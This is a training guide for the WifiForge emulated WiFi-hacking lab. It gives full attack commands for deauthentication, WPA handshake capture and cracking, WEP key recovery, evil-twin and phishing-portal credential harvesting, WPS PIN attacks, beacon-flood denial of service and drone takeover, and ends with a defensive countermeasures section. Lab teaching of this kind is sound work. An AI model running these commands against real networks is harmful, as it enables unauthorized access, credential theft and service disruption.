🛠️ Section 1: Lab Environment & Setup

WifiForge Overview

WifiForge is an open-source WiFi hacking lab framework built on Mininet-WiFi, a network emulator that creates virtual access points and wireless stations in software. Originally developed by Black Hills Information Security (BHIS), WifiForge provides 10 hands-on labs covering reconnaissance through post-exploitation.

Docker Setup

The recommended deployment uses Docker for consistent, reproducible environments.

# Pull and run the WifiForge Docker container docker pull wififorge/wififorge docker run -it --privileged wififorge/wififorge # Launch WifiForge inside the container sudo python3 /WifiForge/WifiForge.py # Return to main menu from any lab main_menu

Mininet-WiFi Architecture

Each lab spins up a virtual network topology with simulated access points (APs), wireless stations (hosts), and an attacker node. The framework handles:

  • Virtual APs: Software access points with configurable SSID, encryption, and channel
  • Wireless stations: Simulated client devices that associate with APs
  • Attacker interface: A monitor-mode capable virtual wireless adapter
  • Network initialization: ~30 seconds per lab to bring up the full topology

tmux Workflow

Labs frequently require multiple terminal panes running simultaneously (e.g., capture in one, deauth in another). WifiForge uses tmux for multi-pane management.

# Essential tmux shortcuts inside WifiForge Ctrl+b % # Split pane vertically Ctrl+b " # Split pane horizontally Ctrl+b arrow # Navigate between panes Ctrl+b d # Detach from session

📡 Section 2: Reconnaissance & Discovery

Before any attack, you need visibility. Wireless reconnaissance identifies target networks, connected clients, encryption types, and channel assignments.

Enabling Monitor Mode (airmon-ng)

Monitor mode allows a wireless adapter to capture all frames on a channel, not just those addressed to it. This is the foundation of all wireless attacks.

# Enable monitor mode airmon-ng start Attacker-wlan0 # Kill interfering processes (NetworkManager, wpa_supplicant) airmon-ng check kill # Verify the monitor interface was created iwconfig # Look for wlan0mon (monitor mode interface) # Disable monitor mode when done airmon-ng stop wlan0mon

Network Scanning (airodump-ng)

With monitor mode active, airodump-ng passively captures beacon frames to enumerate all visible networks, their encryption, signal strength, and connected clients.

# Scan all channels for nearby networks airodump-ng wlan0mon # Output columns: # BSSID — AP MAC address # PWR — Signal strength (closer to 0 = stronger) # Beacons — Number of beacon frames captured # #Data — Number of data frames captured # CH — Channel # ENC — Encryption type (WPA2, WEP, OPN) # ESSID — Network name

Reconnaissance with bettercap

bettercap provides an alternative reconnaissance interface with WiFi module support.

# Start bettercap with WiFi interface bettercap -iface wlan0mon # Enable WiFi reconnaissance module wifi.recon on # Show discovered access points wifi.show # Filter by specific SSID wifi.recon on; set wifi.recon.channel 6

Hidden SSID Detection

Networks with hidden SSIDs still transmit beacon frames — the ESSID field is simply blank. When a client connects, the SSID is revealed in probe request/response frames. airodump-ng shows hidden networks with a blank or <length: N> ESSID. A targeted deauth forces reconnection, revealing the hidden SSID.

🤝 Section 3: WPA/WPA2 Handshake Capture

The 4-way handshake authenticates a client to a WPA/WPA2 access point. Capturing this handshake is the critical prerequisite for offline password cracking. The handshake itself does not contain the password, but it contains enough cryptographic material to verify password guesses offline.

Targeted Capture

# Lock onto target AP: channel 6, specific BSSID, save to file airodump-ng wlan0mon -c 6 --bssid 02:00:00:00:0B:00 -w wificap1 # Watch for "WPA handshake: 02:00:00:00:0B:00" in top-right corner # This confirms a complete 4-way handshake was captured

Deauthentication Attack (aireplay-ng)

If no clients are actively connecting, force a handshake by deauthenticating an existing client. The client will automatically reconnect, generating a new handshake.

# In a second terminal pane (while airodump-ng is capturing) # -0 = deauth attack, 100 = packet count # -a = AP BSSID, -c = target client MAC aireplay-ng wlan0mon -0 100 -a 02:00:00:00:0B:00 -c 02:00:00:00:03:00 # Broadcast deauth (all clients on the AP): aireplay-ng wlan0mon -0 10 -a 02:00:00:00:0B:00

Handshake Verification

After capture, verify the handshake file contains valid EAPOL frames before attempting to crack.

# Quick check with aircrack-ng (will report handshake count) aircrack-ng wificap1-01.cap # Wireshark filter for EAPOL handshake packets eapol

🔒 Section 4: Password Cracking

With a captured handshake, the attack moves offline. Three primary tools handle WiFi password cracking, each with different strengths.

Dictionary Attack with aircrack-ng

aircrack-ng performs CPU-based dictionary attacks directly on .cap files. Fast to set up, no format conversion required.

# Crack WPA handshake with rockyou.txt wordlist aircrack-ng -w /WifiForge/framework/lab_materials/rockyou.txt ./wificap1-01.cap # If multiple networks in capture, specify target BSSID aircrack-ng -w rockyou.txt -b 02:00:00:00:0B:00 ./wificap1-01.cap # Typical output on success: # KEY FOUND! [ password123 ]

GPU Cracking with hashcat

hashcat leverages GPU acceleration for dramatically faster cracking. Requires converting the .cap file to hashcat format first.

# Step 1: Convert .cap to hashcat hc22000 format # Option A: Command-line tool hcxpcapngtool -o capture.hc22000 wificap1-01.cap # Option B: WifiForge includes a browser-based converter # Navigate to file:///WifiForge/.../cap2hashcat/index.html # Step 2: Dictionary attack with hashcat # -m 22000 = WPA-PBKDF2-PMKID+EAPOL mode # -a 0 = dictionary attack hashcat -m 22000 -a 0 capture.hc22000 rockyou.txt --potfile-path loot/cracked.pot # Brute force 8-digit numeric passwords hashcat -m 22000 -a 3 capture.hc22000 ?d?d?d?d?d?d?d?d # Show recovered passwords hashcat -m 22000 capture.hc22000 --show

NTLM Hash Cracking with John the Ripper

When evil twin attacks capture NetNTLM hashes (see Section 6), John the Ripper cracks them using mask-based attacks that narrow the search space.

# Crack NetNTLM hashes with a mask pattern # --mask='Badpass?d' targets patterns like Badpass0, Badpass1, etc. john --format=netntlm /WifiForge/.../loot/wpa_handshake_capture* \ --mask='Badpass?d' \ --min-length=7 --max-length=13 \ --pot=/WifiForge/.../loot/output.pot # John mask charsets: ?d=digit, ?l=lower, ?u=upper, ?s=special, ?a=all

Comparison: aircrack-ng vs hashcat vs John

Feature aircrack-ng hashcat John the Ripper
Processing CPU only GPU accelerated CPU (GPU with OpenCL)
Speed ~2,000 keys/s ~500,000+ keys/s (GPU) ~5,000 keys/s
Input format .cap (native) .hc22000 (conversion required) Various hash formats
Best for Quick dictionary checks Large wordlists, brute force NTLM hashes, mask attacks

🔓 Section 5: WEP Exploitation

WEP (Wired Equivalent Privacy) uses the RC4 stream cipher with weak Initialization Vectors (IVs). By collecting enough encrypted packets, statistical analysis reveals the key — typically in under 60 seconds with sufficient traffic.

WEP Attack Workflow

# 1. Enable monitor mode airmon-ng start Attacker-wlan0 # 2. Scan for WEP networks (look for ENC=WEP) airodump-ng wlan0mon # 3. Lock onto WEP target and capture IVs airodump-ng -c 6 --bssid 02:00:00:00:04:00 wlan0mon -w attack_capture

Traffic Generation with iperf

WEP cracking requires ~25,000+ captured IVs. If the network has low traffic, generate data packets to accelerate IV collection.

# On host1 (connected to WEP network): start traffic server iperf -s # On host2 (another station): generate UDP traffic flood iperf -c 10.0.0.2 -u -b 100M -t 60 # Watch the #Data column in airodump-ng climb past 25,000

Key Recovery

# Crack when enough IVs are collected aircrack-ng ./attack_capture-01.cap # Output on success: # KEY FOUND! [ AB:CD:EF:12:34 ] # Decrypted correctly: 100%

🎭 Section 6: Evil Twin & Credential Harvesting

Evil twin attacks create a rogue access point that impersonates a legitimate network. When users connect, their traffic — and often their credentials — are captured.

Enterprise Credential Capture with EAPHammer

EAPHammer creates a rogue AP targeting WPA-Enterprise (802.1X) networks. When domain-joined devices connect, they attempt RADIUS authentication, leaking NetNTLM hashes to the attacker.

# Launch evil twin targeting enterprise SSID "CORP_NET" # --creds = capture credential hashes # --interface = attacker wireless interface eaphammer -e CORP_NET --creds --interface a-wlan0 # Wait ~1 minute for clients to automatically connect # Captured hashes saved to: # /WifiForge/.../loot/wpa_handshake_capture[timestamp]

Evil Twin Attack Flow

1

Create Rogue AP

EAPHammer broadcasts a matching SSID (CORP_NET)

↓
2

Client Auto-Connects

Domain devices recognize the SSID and attempt 802.1X authentication

↓
3

NetNTLM Hash Captured

Authentication attempt leaks NetNTLM challenge/response to rogue AP

↓
4

Offline Cracking

John the Ripper cracks the NetNTLM hash (see Section 4)

Phishing Portal with wifiphisher

wifiphisher creates a rogue AP with a captive portal — a fake login page that harvests credentials entered by users who think they're connecting to legitimate WiFi.

# Launch rogue AP with phishing portal # -e = target SSID to impersonate # -p wifi_connect = use WiFi connection phishing template # -kB = keep original AP broadcasting (don't deauth) wifiphisher -e CORP_NET -p wifi_connect -kB # On victim machine: scan and connect to fake network iwlist host1-wlan0 scan | grep ESSID iwconfig host1-wlan0 essid CORP_NET # Victim opens browser → sees fake login portal # Credentials appear in attacker's HTTP panel

🔑 Section 7: WPS Attacks

WiFi Protected Setup (WPS) uses an 8-digit PIN for easy device pairing. Due to a design flaw, the PIN is validated in two halves (4+3 digits + checksum), reducing the keyspace from 100,000,000 to ~11,000 combinations.

Pixie Dust Attack (Offline)

The Pixie Dust attack exploits weak random number generation in WPS implementations. If the AP uses predictable nonces, the PIN can be recovered in seconds without brute force.

# Pixie Dust attack with reaver # -K = Pixie Dust mode (offline attack) reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -K -vv # Standalone pixiewps tool (if reaver extracts the parameters) pixiewps -e [PKE] -r [PKR] -s [E-Hash1] -z [E-Hash2] -a [AuthKey] -n [E-Nonce]

WPS PIN Brute Force

# Online brute force (slower, ~4-10 hours) reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv # Add delay to avoid lockout detection reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -d 5 -vv # Check WPS status of nearby networks wash -i wlan0mon

WPS PIN Structure

Component Digits Combinations Notes
First half 4 digits 10,000 Validated independently
Second half 3 digits + checksum 1,000 Last digit is checksum
Total keyspace 8 digits ~11,000 Not 100,000,000

💥 Section 8: Denial of Service

Wireless DoS attacks disrupt network availability by flooding the airspace with management frames. These attacks exploit the fact that 802.11 management frames are unauthenticated in WPA/WPA2 (fixed in WPA3 with Protected Management Frames).

Deauthentication Flood (aireplay-ng)

# Continuous deauth (0 = infinite packets) aireplay-ng -0 0 -a 02:00:00:00:0B:00 wlan0mon # Targeted deauth against specific client aireplay-ng -0 0 -a 02:00:00:00:0B:00 -c 02:00:00:00:03:00 wlan0mon

Beacon Flood with airgeddon

airgeddon provides an interactive menu-driven interface for multiple wireless attacks, including beacon flood DoS that creates hundreds of fake networks.

# Launch airgeddon /WifiForge/airgeddon-WifiForge-Cloud/airgeddon.sh # Workflow: # 1. Select interface: Attacker-wlan0 # 2. Enable monitor mode (option 2) # 3. Navigate to DoS attacks menu (option 4 → 4) # 4. Scan for targets (option 4) # 5. Select target network # 6. Launch Beacon Flood Attack (option 8) # 7. Ctrl+C to stop attack

🚩 Section 9: Drone Hacking

Consumer drones often use standard WiFi for controller-to-drone communication, making them vulnerable to the same attacks used against any WiFi network. Cracking a drone's WiFi key can grant full flight control.

Drone WiFi Reconnaissance

# 1. Enable monitor mode airmon-ng start Attacker-wlan0 # 2. Scan for drone networks (often have identifiable SSIDs) airodump-ng wlan0mon # Look for SSIDs like "DRONE_xxxx", "DJI_xxxx", "TELLO-xxxx" # 3. Lock onto drone's channel and capture airodump-ng wlan0mon -c 3 --bssid 02:00:00:00:04:00 -w drone1

Handshake Capture & Key Recovery

# Force drone controller to reauthenticate aireplay-ng wlan0mon --deauth 0 -a 02:00:00:00:04:00 -c 00:00:00:00:00:01 # Crack the captured handshake aircrack-ng -w /WifiForge/.../rockyou.txt ./drone1-01.cap

Post-Exploitation: Flight Control

With the WiFi key recovered, WifiForge provides a Python-based drone control interface demonstrating post-exploitation capabilities.

🛡️ Section 11: Defense & Countermeasures

WPA3 & SAE

  • SAE handshake: Replaces PSK 4-way handshake with Dragonfly key exchange, immune to offline dictionary attacks
  • Forward secrecy: Each session uses unique keys — compromising one session doesn't expose past sessions
  • PMF mandatory: Protected Management Frames prevent deauthentication attacks entirely
  • OWE: Opportunistic Wireless Encryption provides encryption on open networks without passwords

802.1X Enterprise Authentication

  • RADIUS server: Centralized authentication with per-user credentials and certificates
  • EAP-TLS: Certificate-based mutual authentication — strongest enterprise option
  • Certificate pinning: Prevents rogue RADIUS server attacks (EAPHammer defense)
  • Dynamic key rotation: Per-session, per-user encryption keys

Wireless Intrusion Detection (WIDS/WIPS)

  • Rogue AP detection: Identifies unauthorized access points on the network
  • Deauth flood alerts: Detects sustained deauthentication frame bursts
  • Evil twin detection: BSSID/SSID correlation identifies AP impersonation
  • Tools: Cisco ISE, Aruba ClearPass, open-source Kismet

PSK Policy & Hardening

  • Password length: Minimum 20 characters with random alphanumeric + symbols
  • Disable WPS: WPS PIN is always brute-forceable — disable in production
  • 802.11w (PMF): Enable Protected Management Frames even on WPA2 (optional on WPA2, mandatory on WPA3)
  • Reduce TX power: Lower transmission power limits the attack surface radius
  • Network segmentation: VLANs isolate wireless traffic from critical internal systems
  • Firmware updates: Patch known vulnerabilities (KRACK, FragAttacks, Dragonblood)

Defense Effectiveness Summary

Attack WPA2-PSK WPA2-Enterprise WPA3-SAE
Deauth attack Vulnerable Vulnerable Protected (PMF)
Handshake capture + crack Depends on password N/A (no PSK) Resistant (SAE)
Evil twin (credential) Risk if users re-enter PSK Cert pinning required SAE mutual auth
